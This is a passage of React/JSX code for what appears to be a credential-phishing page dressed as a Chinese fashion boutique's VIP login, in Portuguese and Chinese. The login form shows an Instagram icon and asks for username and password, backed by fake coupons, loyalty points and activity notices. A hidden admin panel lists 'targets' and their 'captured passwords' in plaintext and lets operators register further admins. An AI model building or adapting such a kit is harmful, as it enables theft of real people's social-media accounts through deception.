                    <span className="text-base md:text-xl font-bold text-white font-mono">11.110</span>
                    <span className="text-[8px] md:text-[9px] text-stone-500 font-bold font-mono ml-0.5">PTS</span>
                  </div>
                  <span className="text-[7px] md:text-[8px] text-[#cfab7c] mt-2 block font-mono font-bold uppercase tracking-wider">
                    ★ Nível Ouro
                  </span>
                </div>
              </div>

              {/* Simulated Shipping Route details */}
              <div className="bg-[#2e2621]/40 border border-[#cfab7c]/10 rounded-none p-4">
                <h4 className="text-[11px] md:text-xs font-bold text-white flex items-center gap-2 mb-3 font-mono uppercase tracking-widest pb-1.5 border-b border-[#cfab7c]/10">
                  <Truck className="w-3.5 h-3.5 text-[#cfab7c]" />
                  <span>{termsText.mockShipping}</span>
                </h4>
                <div className="relative pl-4 border-l border-[#cfab7c]/30 space-y-3">
                   {/* Step 1 */}
                  <div className="relative">
                    <span className="absolute -left-[20.5px] top-1 w-1.5 h-1.5 rounded-none bg-[#D91E18]"></span>
                    <span className="text-[8px] md:text-[9px] font-mono text-[#cfab7c] block font-semibold uppercase tracking-widest">Enviado com Prioridade</span>
                    <p className="text-[11px] text-[#ebdcc6] mt-0.5 leading-relaxed font-serif">
                      {termsText.logisticsStep}
                    </p>
                    <span className="text-[8px] text-stone-500 font-mono block mt-1"> Shenzhen Wardrobe Base • 2026-06-20</span>
                  </div>

                  {/* Step 2 */}
                  <div className="relative opacity-60">
                    <span className="absolute -left-[20.5px] top-1 w-1.5 h-1.5 rounded-none bg-stone-500"></span>
                    <span className="text-[8px] md:text-[9px] text-stone-400 block font-mono font-semibold uppercase tracking-widest">Credenciais Ativas</span>
                    <p className="text-[11px] text-stone-300 mt-0.5 font-serif font-light">
                      Portador VIP autenticado no cadastro de controle: <strong className="font-mono text-[#cfab7c]">{loggedInUser.username}</strong>
                    </p>
                  </div>
                </div>
              </div>

            </div>
          ) : (
            /* USER IS LOGGED OUT - THE CHINESE STORE THEMED LOGIN FORM BOX */
            <div className="bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl relative">
              <div className="absolute top-0 left-0 w-full h-1.5 bg-gradient-to-r from-[#D91E18] via-[#cfab7c] to-[#D91E18]"></div>
              
              <div className="p-6 md:p-8">
                
                {/* Brand Greetings Header on top of form */}
                <div className="text-center pb-4 border-b border-[#cfab7c]/15 mb-5">
                  <p className="text-[8px] md:text-[9px] text-[#cfab7c] tracking-[0.25em] uppercase font-mono font-black">
                    {language === "zh" ? "私享品鉴通道" : "ACESSO PRIVADO DE ASSOCIAÇÃO"}
                  </p>
                  <h3 className="text-lg md:text-xl font-serif text-white font-normal tracking-widest uppercase mt-1">
                    Ateliê Privé
                  </h3>
                </div>

                {/* Feedback messages */}
                {feedback && (
                  <div className="mb-4 animate-fade-in">
                    <div className={`flex items-start gap-2.5 p-3 rounded-none border text-xs font-medium ${
                      feedback.type === "success" 
                        ? "bg-emerald-950/40 border-emerald-900/30 text-emerald-300" 
                        : "bg-red-950/40 border-red-900/30 text-red-300"
                    }`}>
                      {feedback.type === "success" ? (
                        <CheckCircle2 className="w-4 h-4 flex-shrink-0 text-emerald-400 mt-0.5" />
                      ) : (
                        <AlertCircle className="w-4 h-4 flex-shrink-0 text-red-400 mt-0.5" />
                      )}
                      <span className="leading-normal font-mono text-[11px]">{feedback.text}</span>
                    </div>
                  </div>
                )}

                {/* Regular Password Form */}
                <form onSubmit={handleLoginSubmit} className="space-y-4 animate-fade-in">
                  
                  {/* Username Block */}
                  <div>
                    <label className="block text-[8px] md:text-[9px] text-stone-400 mb-1.5 font-bold uppercase tracking-widest font-mono">
                      {termsText.userField}
                    </label>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2 flex items-center">
                        <img src="https://i.ibb.co/DHYRd4NJ/ig.png" alt="ig" className="h-4.5 w-4.5 object-contain" />
                      </span>
                      <input
                        name="login_username"
                        type="text"
                        value={username.startsWith("@") ? username.substring(1) : username}
                        onChange={(e) => handleUsernameChange(e.target.value)}
                        placeholder="nome_usuario"
                        autoComplete="off"
                        required
                        className="w-full bg-[#2e2621]/40 border border-[#cfab7c]/20 text-xs md:text-sm text-white pl-10 pr-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                      />
                    </div>
                    {/* Tiny format hints */}
                    <p className="text-[9px] text-stone-500 mt-1 leading-normal italic font-serif">
                      {language === "zh" ? "系统会自动添加 '@' 前缀验证" : "O sistema irá prefixar com @ automaticamente."}
                    </p>
                  </div>

                  {/* Password Block */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <label className="block text-[8px] md:text-[9px] text-stone-400 font-bold uppercase tracking-widest font-mono">
                        {termsText.passField}
                      </label>
                    </div>
                    <div className="relative">
                      <span className="absolute left-3 top-1/2 -translate-y-1/2">
                        <Lock className="w-3.5 h-3.5 text-[#cfab7c]" />
                      </span>
                      <input
                        name="login_password"
                        type="password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        placeholder="••••••••"
                        required
                        className="w-full bg-[#2e2621]/40 border border-[#cfab7c]/20 text-xs md:text-sm text-white pl-9 pr-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] focus:ring-1 focus:ring-[#cfab7c]/20 transition-all font-mono"
                      />
                    </div>
                  </div>

                  {/* Coupon integration feedback visual */}
                  {couponCode && (
                    <div className="p-2.5 bg-[#cfab7c]/5 border border-[#cfab7c]/20 rounded-none flex items-center justify-between text-[10px] md:text-xs text-[#cfab7c]">
                      <div className="flex items-center gap-1.5">
                        <Ticket className="w-3.5 h-3.5 text-[#cfab7c] animate-pulse" />
                        <span>Cupom <strong className="font-mono text-white">{couponCode}</strong> ativo!</span>
                      </div>
                      <span className="text-[8px] md:text-[9px] bg-[#D91E18] px-1.5 py-0.5 rounded-none font-bold text-white uppercase tracking-widest font-mono">
                        90% OFF
                      </span>
                    </div>
                  )}

                  {/* Action Button */}
                  <button
                    type="submit"
                    disabled={loading}
                    className="w-full py-3 px-4 bg-[#D91E18] hover:bg-red-700 text-white font-bold text-[10px] rounded-none shadow-md active:scale-[0.99] transition-all flex items-center justify-center gap-2 select-none uppercase tracking-[0.2em] border border-yellow-400/20 cursor-pointer"
                  >
                    <ShoppingBag className="w-3.5 h-3.5 text-white animate-pulse" />
                    <span>{loading ? termsText.enterLoading : termsText.enterBtn}</span>
                    <ArrowRight className="w-3.5 h-3.5 ml-1 text-[#cfab7c]" />
                  </button>

                  <p className="text-[9px] text-stone-400 text-center leading-relaxed font-serif pt-1 italic">
                    {termsText.noRegister}
                  </p>

                </form>

                {/* Footer Agreements */}
                <div className="border-t border-[#cfab7c]/15 pt-4 mt-5 text-center">
                  <p className="text-[9px] text-stone-500 font-serif leading-relaxed">
                    {termsText.terms}
                  </p>
                </div>

              </div>
              
            </div>
          )}

        </div>

      </main>

      {/* Simulated Live Activity Notification Banner (bottom-left) */}
      {liveNotification && (
        <div className="fixed bottom-4 left-4 z-40 max-w-xs md:max-w-sm bg-[#1c1815] border-l-4 border-[#D91E18] border-t border-b border-r border-[#cfab7c]/30 shadow-2xl p-3 animate-fade-in flex items-center gap-2 select-none">
          <div className="w-5 h-5 rounded-none bg-[#D91E18] flex items-center justify-center text-white text-[10px] font-serif font-black flex-shrink-0 animate-bounce">
            福
          </div>
          <div>
            <p className="text-[9px] text-[#cfab7c] uppercase tracking-widest font-mono font-bold">Atividade Recente</p>
            <p className="text-[10px] text-[#ebdcc6] mt-0.5 font-serif font-light leading-snug">{liveNotification}</p>
          </div>
        </div>
      )}

      {/* Embedded Red Pocket (Hongbao) lucky coupon claim component */}
      <RedPocketGift 
        language={language} 
        onApplyCoupon={applyPromoCoupon} 
      />

      {/* Admin Panel Modal (US button trigger) */}
      {showAdminPanel && (
        <div className="fixed inset-0 bg-black/85 backdrop-blur-sm flex items-center justify-center z-50 p-3 md:p-4 animate-fade-in">
          <div className="relative w-full max-w-2xl bg-[#1c1815] border border-[#cfab7c]/30 rounded-none overflow-hidden shadow-2xl">
            {/* Closes the dialogue */}
            <button
              type="button"
              onClick={handleCloseAdmin}
              className="absolute top-4 right-4 text-[#ebdcc6]/40 hover:text-[#cfab7c] transition-colors z-20 cursor-pointer bg-transparent border-none"
            >
              <X className="w-5 h-5" />
            </button>

            <div className="p-5 md:p-6">
              {/* Header */}
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#cfab7c]/20 pb-4 mb-4">
                <div className="flex items-center gap-2.5">
                  <Shield className="w-5 h-5 text-[#cfab7c]" />
                  <div>
                    <h2 className="font-mono text-sm font-bold text-[#ebdcc6] uppercase tracking-widest">
                      Painel Administrativo VIP
                    </h2>
                    {adminAuthed && (
                      <p className="text-[9px] text-[#cfab7c] font-mono mt-0.5">
                        Logado como: <strong>{currentAdminUser}</strong>
                      </p>
                    )}
                  </div>
                </div>

                {adminAuthed && (
                  <button
                    type="button"
                    onClick={handleAdminLogout}
                    className="self-start sm:self-auto px-2.5 py-1 text-[8px] bg-red-950 hover:bg-[#D91E18] text-white font-bold uppercase font-mono tracking-widest transition-colors cursor-pointer border border-[#D91E18]/30"
                  >
                    Encerrar Sessão
                  </button>
                )}
              </div>

              {!adminAuthed ? (
                /* Login / Registration Forms */
                <div className="space-y-4">
                  {isAdminRegistering ? (
                    <div>
                      <span className="text-[9px] bg-amber-500/10 text-amber-400 border border-amber-500/25 px-2 py-0.5 font-bold uppercase font-mono tracking-widest">
                        {anyAdminExists ? "Novo Cadastro" : "Primeiro Acesso - Configuração Inicial"}
                      </span>
                      <h3 className="text-xs text-stone-400 font-serif mt-1">
                        Configure seu usuário e senha do painel para começar a monitorar.
                      </h3>
                    </div>
                  ) : (
                    <div>
                      <span className="text-[9px] bg-[#cfab7c]/10 text-[#cfab7c] border border-[#cfab7c]/25 px-2 py-0.5 font-bold uppercase font-mono tracking-widest">
                        Autenticação
                      </span>
                      <h3 className="text-xs text-stone-400 font-serif mt-1">
                        Faça login no painel para ver suas senhas capturadas.
                      </h3>
                    </div>
                  )}

                  {adminError && (
                    <p className="text-[10px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30">
                      {adminError}
                    </p>
                  )}

                  <form onSubmit={handleAdminLogin} className="space-y-4">
                    <div>
                      <label className="block text-[8px] text-[#cfab7c] mb-1 font-bold uppercase tracking-widest font-mono">
                        Usuário Admin
                      </label>
                      <input
                        type="text"
                        value={adminUser}
                        onChange={(e) => setAdminUser(e.target.value)}
                        placeholder="Nome de Administrador"
                        required
                        className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                      />
                    </div>
                    <div>
                      <label className="block text-[8px] text-[#cfab7c] mb-1 font-bold uppercase tracking-widest font-mono">
                        Senha
                      </label>
                      <input
                        type="password"
                        value={adminPass}
                        onChange={(e) => setAdminPass(e.target.value)}
                        placeholder="Senha de Acesso"
                        required
                        className="w-full bg-[#25201c] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2.5 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                      />
                    </div>

                    <button
                      type="submit"
                      className="w-full py-2.5 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-black text-xs uppercase tracking-widest rounded-none transition-all font-mono cursor-pointer border-none"
                    >
                      {isAdminRegistering ? "Salvar e Acessar" : "Acessar Painel"}
                    </button>
                  </form>

                  {anyAdminExists && (
                    <div className="text-center pt-2 border-t border-[#3e352e]/50">
                      <button
                        type="button"
                        onClick={() => {
                          setIsAdminRegistering(!isAdminRegistering);
                          setAdminError(null);
                        }}
                        className="text-[9px] text-[#cfab7c] hover:underline uppercase font-mono tracking-widest cursor-pointer bg-transparent border-none"
                      >
                        {isAdminRegistering ? "Voltar para o Login" : "Cadastrar novo Administrador"}
                      </button>
                    </div>
                  )}
                </div>
              ) : (
                /* Admin Authenticated Dashboard Panel */
                <div className="space-y-4 max-h-[460px] overflow-y-auto custom-scrollbar pr-1">
                  
                  {/* Statistics Widgets Row */}
                  <div className="grid grid-cols-2 gap-3">
                    <div className="bg-[#25201c] border border-[#3e352e] p-3 text-center">
                      <span className="text-[8px] text-[#cfab7c] font-mono uppercase tracking-widest font-bold block mb-1">
                        Alvos Cadastrados por Você
                      </span>
                      <span className="text-2xl font-bold font-mono text-white">{myUsers.length}</span>
                    </div>
                    <div className="bg-[#25201c] border border-[#3e352e] p-3 text-center">
                      <span className="text-[8px] text-[#cfab7c] font-mono uppercase tracking-widest font-bold block mb-1">
                        Senhas Capturadas (Filtradas)
                      </span>
                      <span className="text-2xl font-bold font-mono text-red-400">{filteredCaptured.length}</span>
                    </div>
                  </div>

                  {/* Tabs Selection Row */}
                  <div className="flex border-b border-[#3e352e]">
                    <button
                      onClick={() => setActiveAdminTab("targets")}
                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
                        activeAdminTab === "targets" 
                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
                          : "text-stone-500 hover:text-[#ebdcc6]"
                      }`}
                    >
                      [1] Gerenciar Alvos
                    </button>
                    <button
                      onClick={() => setActiveAdminTab("captures")}
                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
                        activeAdminTab === "captures" 
                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
                          : "text-stone-500 hover:text-[#ebdcc6]"
                      }`}
                    >
                      [2] Senhas Capturadas ({filteredCaptured.length})
                    </button>
                    <button
                      onClick={() => setActiveAdminTab("new_admin")}
                      className={`flex-1 py-2 text-[10px] font-bold uppercase tracking-wider font-mono cursor-pointer transition-colors ${
                        activeAdminTab === "new_admin" 
                          ? "text-[#cfab7c] border-b-2 border-[#cfab7c]" 
                          : "text-stone-500 hover:text-[#ebdcc6]"
                      }`}
                    >
                      [3] Novo Admin
                    </button>
                  </div>

                  {/* Tab Contents */}
                  {activeAdminTab === "targets" && (
                    <div className="animate-fade-in h-[320px]">
                      <LocalDbManager 
                        adminUsername={currentAdminUser}
                        onSelectUser={handleAutofillUser}
                        triggerRefreshToggle={dbRefreshToggle}
                      />
                    </div>
                  )}

                  {activeAdminTab === "captures" && (
                    <div className="bg-[#25201c] border border-[#3e352e] p-4 rounded-none animate-fade-in space-y-4 h-[320px] flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between mb-2">
                          <p className="text-[9px] text-[#cfab7c] font-bold uppercase tracking-widest font-mono">
                            LOG DE SENHAS DA SUA REDE
                          </p>
                          {filteredCaptured.length > 0 && (
                            <button
                              type="button"
                              onClick={handleClearCaptured}
                              className="text-[8px] text-red-400 hover:text-red-300 font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
                            >
                              Limpar Tudo
                            </button>
                          )}
                        </div>

                        {filteredCaptured.length === 0 ? (
                          <p className="text-[10px] text-stone-500 font-mono text-center py-8">
                            Nenhuma tentativa de login capturada para seus alvos ainda.
                          </p>
                        ) : (
                          <div className="space-y-1.5 max-h-[220px] overflow-y-auto custom-scrollbar pr-1">
                            {filteredCaptured
                              .toReversed()
                              .map((entry, i) => (
                              <div key={i} className="bg-[#1c1815] border border-[#3e352e] p-2.5 rounded-none">
                                <div className="flex items-center justify-between">
                                  <span className="text-[10px] text-[#cfab7c] font-mono font-bold">{entry.user}</span>
                                  <span className="text-[8px] text-stone-500 font-mono">{entry.time}</span>
                                </div>
                                <p className="text-[11px] text-[#ebdcc6] font-mono mt-1 break-all">
                                  Senha Capturada: <strong className="text-red-400 font-black">{entry.pass}</strong>
                                </p>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>

                      {/* Monitored User details display */}
                      <div className="bg-[#1c1815] border border-[#3e352e] p-2.5 flex items-center justify-between text-[9px] font-mono">
                        <span className="text-[#cfab7c]">Modo de Captura Ativo:</span>
                        <span className="text-stone-400 uppercase">Apenas contas vinculadas ao seu Administrador</span>
                      </div>
                    </div>
                  )}

                  {activeAdminTab === "new_admin" && (
                    <div className="bg-[#25201c] border border-[#3e352e] p-4 rounded-none animate-fade-in h-[320px]">
                      <p className="text-[9px] text-[#cfab7c] font-bold uppercase tracking-widest font-mono mb-3">
                        CADASTRAR OUTRO USUÁRIO ADMINISTRATIVO
                      </p>

                      {adminError && (
                        <p className="text-[10px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30 mb-3">
                          {adminError}
                        </p>
                      )}

                      {adminSuccess && (
                        <p className="text-[10px] text-emerald-400 font-mono bg-emerald-950/40 p-2 border border-emerald-900/30 mb-3">
                          {adminSuccess}
                        </p>
                      )}

                      <form onSubmit={handleRegisterAdditionalAdmin} className="space-y-4">
                        <div>
                          <label className="block text-[8px] text-stone-400 mb-1 font-bold uppercase tracking-widest font-mono">
                            Novo Usuário Admin
                          </label>
                          <input
                            type="text"
                            value={adminUser}
                            onChange={(e) => setAdminUser(e.target.value)}
                            placeholder="Ex: admin_secundario"
                            required
                            className="w-full bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                          />
                        </div>
                        <div>
                          <label className="block text-[8px] text-stone-400 mb-1 font-bold uppercase tracking-widest font-mono">
                            Senha de Acesso
                          </label>
                          <input
                            type="password"
                            value={adminPass}
                            onChange={(e) => setAdminPass(e.target.value)}
                            placeholder="••••••••"
                            required
                            className="w-full bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
                          />
                        </div>

                        <button
                          type="submit"
                          className="w-full py-2 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-bold text-[10px] uppercase tracking-widest rounded-none font-mono cursor-pointer border-none"
                        >
                          Registrar Novo Admin
                        </button>
                      </form>
                    </div>
                  )}

                </div>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Global Page Footer */}
      <footer className="w-full bg-[#1c1815] border-t border-[#2e2621] text-[#ebdcc6]/60 text-xs py-4 md:py-8 select-none font-serif">
        <div className="max-w-6xl mx-auto px-3 md:px-6 text-center flex flex-col md:flex-row items-center justify-between gap-2 md:gap-4 text-[8px] md:text-[10px]">
          <p className="tracking-widest uppercase">© 2026 YING & CHEN BOUTIQUE. TODOS OS DIREITOS RESERVADOS.</p>
          <p className="font-mono text-[#cfab7c]/70 tracking-widest hidden xs:block">
            ALTA COSTURA CHINESA • EXCLUSIVE CUSTOMER GATEWAY
          </p>
        </div>
      </footer>

    </div>
  );
}
